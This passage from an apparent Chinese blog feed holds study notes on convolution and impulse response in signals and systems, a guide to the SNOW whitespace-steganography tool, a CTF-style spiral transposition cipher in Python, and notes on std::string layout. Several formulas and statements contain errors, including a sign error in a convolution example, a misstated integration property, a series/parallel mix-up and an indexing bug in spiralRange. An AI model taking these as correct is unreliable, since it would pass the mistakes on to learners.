称作<strong>初始状态</strong>（<span class="math inline">\(0_+\)</span>
状态），或<strong>导出的起始状态</strong>。</li>
</ul>
<h3 id="零输入响应与零状态响应">零输入响应与零状态响应</h3>
<p>齐次解的函数特性仅依赖于系统本身，与激励信号的函数形式无关，因而称为系统的<strong>自由响应</strong>（固有响应）。</p>
<p>但特解的形式完全由激励函数决定，因而称为系统的<strong>强迫响应</strong>（受迫响应）。</p>
<p><strong>零输入响应：没有外加激励信号的作用，只由起始状态（起始时刻储能）所产生的响应。</strong></p>
<blockquote>
<p>一般以 <span class="math inline">\(r_{zi}(t)\)</span> 表示。（zero
input 为零输入的英文）</p>
<p>仅字面意思可理解为不考虑任何输入对系统的作用，仅关注系统本身的性质。</p>
</blockquote>
<p><strong>零状态响应：不考虑起始时刻的系统储能的作用（起始状态为
0，或零初始条件）由系统外加激励信号所产生的响应。</strong></p>
<blockquote>
<p>一般以 <span class="math inline">\(r_{zs}(t)\)</span> 表示。（zero
state 为零状态的英文）</p>
<p>仅字面意思可理解为不考虑任何系统本身，仅考虑输入对系统所产生的影响。</p>
</blockquote>
<p>按照上述定义，可以知道 <span class="math display">\[
r_{zi}(t)=\sum^n_{k=1}A_{zik}e^{\lambda_k t}
\]</span> 即，<strong>零状态输入是齐次解的一部分</strong>。</p>
<p>其中常系数可以由 <span class="math inline">\(r^{(k)}(0_-)\)</span>
决定，即由 <span class="math inline">\(0_-\)</span> 状态决定。</p>
<p>而 <span class="math inline">\(r_{zs}(t)\)</span>
理应是解的剩下一部分，即 <span class="math display">\[
r_{zs}(t)=\sum^n_{k=1}A_{zsk}e^{\lambda_kt}+B(t)
\]</span> 即为<strong>自由响应的一部分与强迫相应之和</strong>。</p>
<p>从中我们可以得出一个结论<strong>：自由响应中的两部分，一部分由起始状态决定，另一部分由激励信号决定</strong>。</p>
<blockquote>
<p>有一个附加结论：当系统无储能，零输入响应即为零。当一个系统发生跳变，则只可能影响零状态响应。</p>
</blockquote>
<p>例如，求如下微分方程的自由响应、强迫响应、零输入响应和零状态响应以及完全响应。
<span class="math display">\[
\frac{\diff}{\diff{t}}r(t)+3r(t)=3e(t)
\]</span> 其中 <span class="math inline">\(e(t)=u(t)\)</span>，起始状态
<span class="math inline">\(r(0_-)=\frac{3}{2}\)</span>。</p>
<blockquote>
<p>这里的 <span class="math inline">\(u(t)\)</span>
表示前文的单位阶跃信号。</p>
</blockquote>
<p>由经典法可得，自由响应 <span class="math display">\[
r_h(t)=\frac{1}{2}e^{-3t}
\]</span> 强迫响应 <span class="math display">\[
r_p(t)=1
\]</span> 完全响应 <span class="math display">\[
r(t)=\frac{1}{2}e^{-3t}+1
\]</span> 求零输入响应可得 <span class="math display">\[
r_{zi}(t)=\frac{3}{2}e^{-3t}
\]</span> 令 <span class="math inline">\(r(0_+)=0\)</span>，解得</p>
<blockquote>
<p>不考虑起始状态的储能 <span class="math inline">\(r(0_-)\)</span>，故没有发生跳变的情况下 <span class="math inline">\(r(0_-)=r(0_+)=0\)</span></p>
</blockquote>
<p><span class="math display">\[
r_{zs}(t)=-e^{-3t}+1
\]</span></p>
<p><strong>零状态响应的用处</strong></p>
<ol type="1">
<li>由于大量的通信与电子系统的系统储能一般都为零，故只需讨论零状态响应。</li>
<li>零状态响应可用<strong>卷积</strong>求解。</li>
<li>零响应满足系统叠加性和齐次性，便于我们研究其他 LTI 系统。</li>
</ol>
<h3 id="冲激响应与阶跃响应">冲激响应与阶跃响应</h3>
<p><strong>以单位冲激信号 <span class="math inline">\(\delta(t)\)</span>
作为激励信号，系统所产生的零状态响应称为单位冲激响应（冲激响应）。</strong></p>
<p><strong>以单位阶跃信号 <span class="math inline">\(u(t)\)</span>
作为激励信号，系统所产生的零状态响应称为单位阶跃响应（阶跃响应）。</strong></p>
<p>对某个激励信号求解零状态响应，可以转化为将这个激励信号分解为无数个单位冲激信号，然后求和每个单位冲激信号的冲激响应，这是<strong>卷积求解零状态响应</strong>的基本原理。</p>
<blockquote>
<p>利用了线性系统的叠加性和齐次性，显然响应可以化为冲激响应和。在这里利用<strong>卷积加权求和</strong>的特性，解得冲激响应和。</p>
</blockquote>
<p>首先我们要知晓如何计算冲激响应 <span class="math inline">\(h(t)\)</span>。</p>
<p>对于微分方程 <span class="math display">\[
\newcommand{\diff}{\mathrm{d}}
C_0\frac{\diff^n}{\diff{t^n}}r(t)+C_1\frac{\diff^{n-1}}{\diff{t^{n-1}}}r(t)+\cdots+C_{n-1}\frac{\diff}{\diff{t}}r(t)+C_nr(t)\\
=E_0\frac{\diff^m}{\diff{t^m}}e(t)+E_1\frac{\diff^{m-1}}{\diff{t^{m-1}}}e(t)+\cdots+E_{m-1}\frac{\diff}{\diff{t}}e(t)+E_me(t)
\]</span> 代入 <span class="math inline">\(e(t)=\delta(t)\)</span>，可得右式可能为冲激函数、冲击偶函数及其各阶导数。</p>
<p>由于要使左右式子平衡，故 <span class="math inline">\(h(t)\)</span> 与
<span class="math inline">\(m,n\)</span> 的相对大小相关。</p>
<blockquote>
<p><span class="math inline">\(m,n\)</span>
的相对大小可以评估为左右式导数阶数。</p>
</blockquote>
<p>一般的系统都会有 <span class="math inline">\(n&gt;m\)</span>，此时
<span class="math inline">\(h(t)\)</span> 中不包含 <span class="math inline">\(\delta(t)\)</span> 及其各阶导数，简单来说，<span class="math inline">\(h(t)\)</span> 与齐次解形式相同 <span class="math display">\[
h(t)=\sum^n_{i=1}A_ie^{\lambda_i t}
\]</span> 对系数的求解可以直接使用系数匹配法。</p>
<blockquote>
<p>一般来说，如果 <span class="math inline">\(n=m+1\)</span>，即左式是二阶微分方程，右式是一阶微分方程，则设
<span class="math display">\[
h(t)=(\sum^n_{i=1}A_ie^{\lambda_i t})u(t)
\]</span> 因为 <span class="math inline">\(h(t)\)</span> 不包含 <span class="math inline">\(\delta(t)\)</span>
及其各阶导数，但是方程两式又出现相等，那么 <span class="math inline">\(h(t)\)</span> 只可能包含 <span class="math inline">\(\delta(t)\)</span> 的各阶积分，在这里 <span class="math inline">\(u(t)\)</span> 是 <span class="math inline">\(\delta(t)\)</span>
的一阶积分，即单位阶跃函数。</p>
<p>同理，如果 <span class="math inline">\(n=m+2\)</span>，那么设 <span class="math display">\[
h(t)=(\sum^n_{i=1}A_ie^{\lambda_i t})R(t)
\]</span> 在这里，<span class="math inline">\(R(t)\)</span> 是 <span class="math inline">\(\delta(t)\)</span>
的二阶积分，即单位斜变函数。</p>
</blockquote>
<p>例如，求解如下微分方程的冲激响应 <span class="math inline">\(h(t)\)</span> <span class="math display">\[
\frac{\diff^2}{\diff{t^2}}r(t)+4\frac{\diff}{\diff{t}}r(t)+3r(t)=\frac{\diff}{\diff{t}}e(t)+2e(t)
\]</span> 利用经典法可得 <span class="math display">\[
r_h(t)=A_1e^{-t}+A_2e^{-3t}
\]</span> 故设 <span class="math display">\[
h(t)=(A_1e^{-t}+A_2e^{-3t})u(t)
\]</span> 代入后作系数的一一对应，可求解得到 <span class="math display">\[
A_1=A_2=\frac{1}{2}
\]</span> 故冲激响应为 <span class="math display">\[
h(t)=\frac{1}{2}(e^{-t}+e^{-3t})u(t)
\]</span> <img src="/signal-and-system-note2/冲激响应表.png" alt="冲激响应表"></p>
<blockquote>
<p>如果 <span class="math inline">\(n\leq m\)</span>，很显然 <span class="math inline">\(h(t)\)</span> 包含 <span class="math inline">\(\delta(t)\)</span> 及其导数，例如当 <span class="math inline">\(n=m\)</span> 时，可设 <span class="math display">\[
h(t)=(\sum^n_{i=1}A_ie^{\lambda_i t})u(t)+B\delta(t)
\]</span> 但此种情况更推荐选择求阶跃响应 <span class="math inline">\(g(t)\)</span>，可设 <span class="math display">\[
g(t)=(\sum^n_{i=1}A_ie^{\lambda_i t})u(t)
\]</span></p>
</blockquote>
<p><strong>求解阶跃响应 <span class="math inline">\(g(t)\)</span>
同理。</strong></p>
<p>且在 LTI 系统中阶跃响应与冲激响应的关系为 <span class="math display">\[
g(t)=\int^t_{-\infty}h(\tau)\diff{\tau}
\]</span>
需要注意的重点是，<strong>冲激响应与阶跃响应完全由系统本身决定，与外界因素无关</strong>。</p>
<blockquote>
<p>同时由于冲激函数和阶跃函数的关联性，冲激响应与阶跃响应也有一定的关联性，这里可以用
<strong>LTI 系统的微分性</strong>。</p>
</blockquote>
<h3 id="卷积">卷积</h3>
<p>由单位冲激信号的特性，我们知道 <span class="math display">\[
f(t_0)=\int^{\infty}_{-\infty}f(t)\delta(t-t_0)\diff{t}=f(t_0)\delta(t-t_0)\Delta{t_0}
\]</span> 故对于任意处的激励信号，可以表示为冲激信号，即 <span class="math display">\[
e(t_k)=e(t_k)\delta(t-t_k)\Delta{t_k}
\]</span> 显然 <span class="math inline">\(e(t_k)\Delta{t_k}\)</span>
在此式中为常数，对于此冲激信号有<strong>冲激响应</strong>为 <span class="math display">\[
e(t_k)\Delta{t_k}\cdot h(t-t_k)
\]</span> 对该冲激响应求和 <span class="math display">\[
\sum^n_{k=1}e(t_k)\Delta{t_k}\cdot h(t-t_k)
\]</span> 当 <span class="math inline">\(\Delta t_k\to 0\)</span>
时，即可写为积分形式 <span class="math display">\[
r(t)=\int^t_0 e(\tau)h(t-\tau)\diff{\tau}
\]</span></p>
<blockquote>
<p>这里的 <span class="math inline">\(r(t)\)</span>
的实际意义是零状态响应，因为是冲激响应之和。</p>
</blockquote>
<p>例如，有如下一个激励信号（以离散信号为例）</p>
<figure>
<img src="/signal-and-system-note2/假设的激励信号.png" alt="假设的激励信号">
<figcaption aria-hidden="true">假设的激励信号</figcaption>
</figure>
<p>对于一个系统的冲激响应如下（以离散响应为例）</p>
<figure>
<img src="/signal-and-system-note2/假设的冲激响应.png" alt="假设的冲激响应">
<figcaption aria-hidden="true">假设的冲激响应</figcaption>
</figure>
<p>显然对于每一个激励可以用冲激函数简单表示为 <span class="math display">\[
e_0=e_0\delta(t-0)=a\cdot \delta(t-0)\\
e_1=e_1\delta(t-1)=b\cdot \delta(t-1)\\
e_2=e_2\delta(t-2)=c\cdot \delta(t-2)
\]</span> 那么对于每个激励所造成的响应可以简单表示为 <span class="math display">\[
r_0=e_0h(t-0)=a\cdot h(t-0)\\
r_1=e_1h(t-1)=b\cdot h(t-1)\\
r_2=e_2h(t-2)=c\cdot h(t-2)
\]</span> 其中，<span class="math inline">\(h(t-0),h(t-1),h(t-2)\)</span>
分别代表冲激函数移位的结果。</p>
<p>我们可以得到每个激励的响应 <span class="math inline">\(r_0,r_1,r_2\)</span> 如下</p>
<figure>
<img src="/signal-and-system-note2/r0信号.png" alt="r0信号">
<figcaption aria-hidden="true">r0信号</figcaption>
</figure>
<figure>
<img src="/signal-and-system-note2/r1信号.png" alt="r1信号">
<figcaption aria-hidden="true">r1信号</figcaption>
</figure>
<figure>
<img src="/signal-and-system-note2/r2信号.png" alt="r2信号">
<figcaption aria-hidden="true">r2信号</figcaption>
</figure>
<p>最后根据叠加原理，得到最终的响应</p>
<figure>
<img src="/signal-and-system-note2/响应r(t).png" alt="响应r(t)">
<figcaption aria-hidden="true">响应r(t)</figcaption>
</figure>
<p>在信号与系统中，我们把这种信号的叠加积分运算（或离散求和运算）称作<strong>卷积</strong>。</p>
<p>卷积的定义式如下 <span class="math display">\[
f(t)*g(t)=\int^{\infty}_{-\infty}f(\tau)g(t-\tau)\diff{\tau}
\]</span> 其中 <span class="math inline">\(*\)</span>
代表对两个函数求卷积。</p>
<p>根据上面的例子，可以知道卷积的运算实际上是用 <span class="math inline">\(f(t)\)</span> 的每个值倍乘 <span class="math inline">\(g(t)\)</span>
函数，同时移位到每个值对应的位置上后，进行求和，积分仅是<strong>连续</strong>求和。</p>
<p>例如，系统微分方程如下，<span class="math inline">\(e(t)=u(t)-u(t-t_0)\)</span>，求解冲激响应 <span class="math inline">\(h(t)\)</span> 和零状态响应。 <span class="math display">\[
\frac{\diff}{\diff{t}}r(t)+3r(t)=e(t)
\]</span> 易求 <span class="math display">\[
h(t)=e^{-3t}u(t)
\]</span> 则零状态响应 <span class="math display">\[
\begin{align}
r(t)&amp;=\int^t_0 [u(\tau)-u(\tau-t_0)]e^{-3(t-\tau)}\diff{\tau}\\
&amp;=u(t)\int^t_0 e^{-3(t-\tau)}\diff{\tau}+u(t-t_0)\int^t_{t_0}
e^{-3(t-\tau)}\diff{\tau}\\
&amp;=\frac{1}{3}(1-e^{-3t})u(t)+\frac{1}{3}[1-e^{-3(t-t_0)}]u(t-t_0)
\end{align}
\]</span></p>
<blockquote>
<p>这里运用了卷积的方法求零状态响应，其中第一步到第二步用了积分的加法性质，<span class="math inline">\(u(t)\)</span> 是单位阶跃函数，故 <span class="math inline">\(u(t-t_0)\)</span> 使得积分上下限改变。</p>
</blockquote>
<h3 id="卷积的性质">卷积的性质</h3>
<h4 id="交换律">交换律</h4>
<p><span class="math display">\[
f(t)*g(t)=g(t)*f(t)
\]</span></p>
<h4 id="分配律">分配律</h4>
<p><span class="math display">\[
f(t)*[g(t)+h(t)]=f(t)*g(t)+f(t)*h(t)
\]</span></p>
<blockquote>
<p>应用于并联系统的分析，<strong>两系统各自的冲激响应之和等于并联系统的冲激响应</strong>。</p>
<figure>
<img src="/signal-and-system-note2/并联系统的卷积.png" alt="并联系统的卷积">
<figcaption aria-hidden="true">并联系统的卷积</figcaption>
</figure>
</blockquote>
<h4 id="结合律">结合律</h4>
<p><span class="math display">\[
[f(t)*g(t)]*h(t)=f(t)*[g(t)*h(t)]
\]</span></p>
<blockquote>
<p>应用于串联系统的分析，<strong>两系统各自的冲激响应的卷积等于并联系统的冲激响应</strong>。</p>
<figure>
<img src="/signal-and-system-note2/串联系统的卷积.png" alt="串联系统的卷积">
<figcaption aria-hidden="true">串联系统的卷积</figcaption>
</figure>
</blockquote>
<h4 id="微分">微分</h4>
<p><span class="math display">\[
\begin{align}
\frac{\diff}{\diff{t}}[f(t)*g(t)]
&amp;=f(t)*\frac{\diff}{\diff{t}}g(t)\\
&amp;=\frac{\diff}{\diff{t}}f(t)*g(t)
\end{align}
\]</span></p>
<blockquote>
<p>高阶微分同理，保证各自微分阶数和为总微分阶数即可。</p>
</blockquote>
<h4 id="积分">积分</h4>
<p><span class="math display">\[
\begin{align}
\int[f(t)*g(t)]\diff{t}
&amp;=\int f(t)\diff{t}\cdot g(t)\\
&amp;=f(t)\cdot \int g(t)\diff{t}
\end{align}
\]</span></p>
<blockquote>
<p>高阶积分同理，保证各自积分阶数和为总积分阶数即可。</p>
</blockquote>
<h4 id="与冲激函数的卷积">与冲激函数的卷积</h4>
<p><span class="math display">\[
f(t)*\delta(t-t_0)=f(t-t_0)
\]</span></p>
<p>利用微分性质，与冲激偶函数的卷积为 <span class="math display">\[
f(t)*\delta&#39;(t-t_0)=f&#39;(t-t_0)
\]</span> 利用积分性质，与单位阶跃函数的卷积 <span class="math display">\[
f(t)*u(t)=\int f(t)\diff{t}
\]</span> 推广到一般情况有 <span class="math display">\[
f(t)*\delta^{(k)}(t-t_0)=f^{(k)}(t-t_0)
\]</span> 即，微分积分的传递性。</p>
<blockquote>
<p>即卷积满足线性运算。</p>
</blockquote>
<h3 id="用算子表示微分方程注意事项">用算子表示微分方程注意事项</h3>
<p>在经典法中提过，使用 <span class="math inline">\(p\)</span> 表示微分
<span class="math display">\[
p=\frac{\diff}{\diff{t}}
\]</span> 用 <span class="math inline">\(\frac{1}{p}\)</span> 表示积分
<span class="math display">\[
\frac{1}{p}=\int\diff{t}
\]</span>
但需要注意的是，化为符号算子表示微分方程只为简化表示和运算，并非真正满足多项式运算的算子。</p>
<ol type="1">
<li><span class="math inline">\(p\)</span>
多项式可以进行<strong>因式分解和同类项合并</strong>；</li>
<li><strong>不可任意消去</strong>等式两端的 <span class="math inline">\(p\)</span>；</li>
<li><strong>微分积分次序不可交换</strong>。</li>
</ol>
<h3 id="传输算子">传输算子</h3>
<p>在开头提过，微分方程可写成 <span class="math display">\[
C_0p^nr(t)+C_1p^{n-1}r(t)+\cdots+C_{n-1}pr(t)+C_nr(t)=E_0p^me(t)+E_1p^{m-1}e(t)+\cdots+E_{m-1}pe(t)+E_me(t)
\]</span> 定义 <span class="math display">\[
D(p)=C_0p^n+C_1p^{n-1}+\cdots+C_{n-1}p+C_n\\
N(p)=E_0p^m+E_1p^{m-1}+\cdots+E_{m-1}p+E_m
\]</span> 那么原方程可化为 <span class="math display">\[
r(t)=\frac{N(p)}{D(p)}e(t)
\]</span> 我们定义 <span class="math display">\[
H(p)=\frac{N(p)}{D(p)}
\]</span> 称作<strong>系统传输算子</strong>。</p>
<blockquote>
<p>自动控制原理中称作传递函数。</p>
</blockquote>
<p>传输算子完整地建立了描述系统的顺序模型，一些有用的系统特性可以通过对
<span class="math inline">\(H(p)\)</span> 分析而得出。</p>
<blockquote>
<p>跟拉氏变换法形式一致。</p>
</blockquote>
]]></content>
      <tags>
        <tag>信号与系统</tag>
      </tags>
  </entry>
  <entry>
    <title>snow隐写笔记</title>
    <url>//snow-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>SNOW 是 the Steganographic Nature Of Whitespace 的简写。</p>
<p>SNOW 用于通过在行尾附加空格和制表符来隐藏 ASCII
文本中的消息，即<strong>文本隐写</strong>。由于空格和制表符在文本查看器中通常不可见，因此消息实际上对不经意的观察者隐藏。并且如果使用内置加密，即使检测到消息也无法读取。</p>
<p>在文本中定位尾随空格就像在暴风雪中找到北极熊，而且它使用了 ICE
加密算法，与名字主题一致。</p>
<p>特别地，注意到 SNOW 的 logo 并不是纯白的，里面有一个由 254
像素值描绘的北极熊（跟图片隐写相关）。</p>
<figure>
<img src="/snow-note/snow-logo.gif" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>我们可以调整颜色图，即可看到那只北极熊！</p>
<figure>
<img src="/snow-note/pbear.gif" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>一般来说， SNOW 隐写主要运用在 HTML 文件（网页）中，所以 SNOW
隐写又被称为 HTML 隐写。</p>
<h1 id="安装">安装</h1>
<p>我们可以在官网下载到对应系统的 SNOW 程序：<a href="https://www.darkside.com.au/snow/">https://www.darkside.com.au/snow/</a></p>
<p>SNOW 是免安装的，下载即可使用。</p>
<h1 id="使用">使用</h1>
<h2 id="参数">参数</h2>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 75%">
</colgroup>
<thead>
<tr class="header">
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-C</code></td>
<td>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</td>
</tr>
<tr class="even">
<td><code>-Q</code></td>
<td>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</td>
</tr>
<tr class="odd">
<td><code>-S</code></td>
<td>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</td>
</tr>
<tr class="even">
<td><code>-p password</code></td>
<td>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</td>
</tr>
<tr class="odd">
<td><code>-l line-length</code></td>
<td>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</td>
</tr>
<tr class="even">
<td><code>-f message-file</code></td>
<td>此文件的内容将隐藏在输入文本文件中。</td>
</tr>
<tr class="odd">
<td><code>-m message-string</code></td>
<td>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</td>
</tr>
</tbody>
</table>
<h2 id="实例">实例</h2>
<ul>
<li><p>加密消息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-m</span> <span class="string">&quot;qsdz yyds&quot;</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure></li>
<li><p>提取消息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure></li>
</ul>
<p>需要注意的是，<code>infile</code> 必须在 <code>outfile</code>
前，如果不填 <code>infile</code> 选项，则默认从标准输入中获得；如果不填
<code>outfile</code> 选项，则默认输出到标准输出中。</p>
<p>更多使用方法可以参考跟 SNOW.EXE 一起下载下来的 SNOW.DOC
文件，这是一个 SNOW 说明书。</p>
<h2 id="其他">其他</h2>
<p>可以使用在线加解密网站：<a href="https://fog.misty.com/perry/ccs/snow/snow/snow.html">https://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p>
<p>但是需要注意的是，加解密网站只对 URL
网页有效，同时指向的网页不能是重定向网页或其他无效网页。</p>
<p>还有在线 java 小程序：<a href="http://fog.misty.com/perry/ccs/snow/jsnowapp/jsnowapp.html">http://fog.misty.com/perry/ccs/snow/jsnowapp/jsnowapp.html</a></p>
<p>该小程序可以对文件使用。（但是你的浏览器需要支持使用 java）</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>螺旋加密笔记</title>
    <url>//spiral-encrypt-note.html</url>
    <content><![CDATA[<h1 id="算法详解">算法详解</h1>
<p>螺旋矩阵即一个按顺时针顺序螺旋排序的正方形矩阵，呈现一个螺旋状，故称为螺旋矩阵。</p>
<figure>
<img src="/spiral-encrypt-note/spiral%20matrix.jpg" alt="spiral matrix">
<figcaption aria-hidden="true">spiral matrix</figcaption>
</figure>
<p>螺旋式的迭代是算法上的问题，这里给出螺旋迭代的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spiral</span>(<span class="params">row: <span class="built_in">int</span>, col: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    顺时针螺旋迭代器，返回一个键值对</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        row - 矩阵行数</span></span><br><span class="line"><span class="string">        col - 矩阵列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        键值对 (i, j)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    left, right = <span class="number">0</span>, col</span><br><span class="line">    up, down = <span class="number">0</span>, row</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> up &lt; down:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(left, right):</span><br><span class="line">            <span class="keyword">yield</span> y, x</span><br><span class="line">        up += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(up, down):</span><br><span class="line">            <span class="keyword">yield</span> y, x</span><br><span class="line">        right -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(left, right)[::-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">yield</span> y, x</span><br><span class="line">        down -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(up, down)[::-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">yield</span> y, x</span><br><span class="line">        left += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spiralRange</span>(<span class="params">row: <span class="built_in">int</span>, col: <span class="built_in">int</span>, start: <span class="built_in">int</span> = <span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    顺时针螺旋序列生成器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        row - 矩阵行数</span></span><br><span class="line"><span class="string">        col - 矩阵列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        顺时针螺旋序列</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r = [<span class="number">0</span>] * (row * col)</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> spiral(row, col):</span><br><span class="line">        r[i * row + j] = start</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spiralMat</span>(<span class="params">row: <span class="built_in">int</span>, col: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    顺时针螺旋矩阵生成器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        row - 矩阵行数</span></span><br><span class="line"><span class="string">        col - 矩阵列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        顺时针螺旋矩阵</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r = <span class="built_in">list</span>(spiralRange(row, col))</span><br><span class="line">    mat = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        mat.append(r[i*col:(i+<span class="number">1</span>)*col])</span><br><span class="line">    <span class="keyword">return</span> mat</span><br></pre></td></tr></table></figure>
<p>加密序列的示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&#x27;ohhhhhhf5-410f3f969bl696&#125;6-a-1eb59ge1-4d3&#123;f9af107&#x27;</span></span><br><span class="line">size = <span class="built_in">len</span>(data)</span><br><span class="line">c = math.isqrt(size)</span><br><span class="line"><span class="built_in">print</span>(c, c*c, size)</span><br><span class="line">k = [<span class="string">&#x27;&#x27;</span>] * size</span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(spiralRange(c, c)):</span><br><span class="line">    k[j] = data[i]</span><br></pre></td></tr></table></figure>
<p>解密序列的示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&#x27;ohhhhhhf5-410f3f969bl696&#125;6-a-1eb59ge1-4d3&#123;f9af107&#x27;</span></span><br><span class="line">size = <span class="built_in">len</span>(data)</span><br><span class="line">c = math.isqrt(size)</span><br><span class="line"><span class="built_in">print</span>(c, c*c, size)</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> spiralRange(c, c):</span><br><span class="line">    k += data[i]</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>std::string笔记</title>
    <url>//std-string-note.html</url>
    <content><![CDATA[<h1 id="stdstring"><code>std::string</code></h1>
<h2 id="简述">简述</h2>
<p>C++ 中有着一个标准实现的 Standard Template Library（STL），其中
<code>std::string</code> 是其中一个经常被使用的特化模板类（特化类型为
<code>std::basic_string&lt;char&gt;</code>）。</p>
<p>出于 C++ ISO 标准委员会的效率和耦合性考虑，实际上
<code>std::string</code> 与 <code>std::vector&lt;char&gt;</code>
相差不大，底层实现原理基本上与之相同，接口函数也基本上一模一样。不过实际上
<code>std::string</code>
是经过特殊优化的，例如底层实际上对小字符串进行了一定程度的优化，避免频繁请求堆内存空间。</p>
<h2 id="底层实现与内存空间">底层实现与内存空间</h2>
<p>以 GCC 为例，<code>std::string</code> 的设计可以简化为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">__string_value</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> local[<span class="number">16</span>];                 <span class="comment">// 小字符串的本地空间</span></span><br><span class="line">    <span class="type">size_t</span> nMaxSize;                <span class="comment">// 容器已分配的空间大小</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">string</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* actual;                   <span class="comment">// 容器的堆指针 (只有当字符串大小超过16才有效)</span></span><br><span class="line">    __string_value value;           <span class="comment">// 容器的缓冲区 (容器的一个优化措施)</span></span><br><span class="line">    <span class="type">size_t</span> nSize;                   <span class="comment">// 容器已使用的空间大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>或者另一个常见的版本：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">__string_value</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> local[<span class="number">16</span>];                 <span class="comment">// 小字符串的本地空间</span></span><br><span class="line">    <span class="type">char</span>* actual;                   <span class="comment">// 容器的堆指针 (只有当字符串大小超过16才有效)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">string</span></span><br><span class="line">&#123;</span><br><span class="line">    __string_value value;           <span class="comment">// 容器的空间 (容器的一个优化措施)</span></span><br><span class="line">    <span class="type">size_t</span> nSize;                   <span class="comment">// 容器已使用的空间大小</span></span><br><span class="line">    <span class="type">size_t</span> nMaxSize;                <span class="comment">// 容器已分配的空间大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，在旧标准版本中（C++11之前），由于 C
标准布局类型导致空基类会占用四字节的空间（实际上空基类占用的是一字节，但是被补齐为四字节）。</p>
<p>一个可能的空间分布如下：</p>
<figure>
<img src="/std-string-note/image-20220816135930341.png" alt="image-20220816135930341">
<figcaption aria-hidden="true">image-20220816135930341</figcaption>
</figure>
